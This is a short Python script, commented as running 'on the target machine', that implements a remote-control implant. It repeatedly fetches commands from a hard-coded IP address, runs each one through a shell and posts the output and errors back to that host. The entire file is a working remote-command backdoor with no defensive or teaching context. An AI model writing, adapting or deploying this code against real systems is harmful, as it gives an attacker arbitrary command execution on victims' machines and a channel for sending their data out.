# This client runs on the target machine

import subprocess
import requests
import time


url = 'http://172.31.98.43'

while True:
    req = requests.get(url)
    command = req.text
    if 'terminate' in command:
        break
    else:
        CMD = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        post_response = requests.post(
            url=url,
            data=CMD.stdout.read()
        )
        post_response = requests.post(
            url=url,
            data=CMD.stderr.read()
        )
    time.sleep(1)
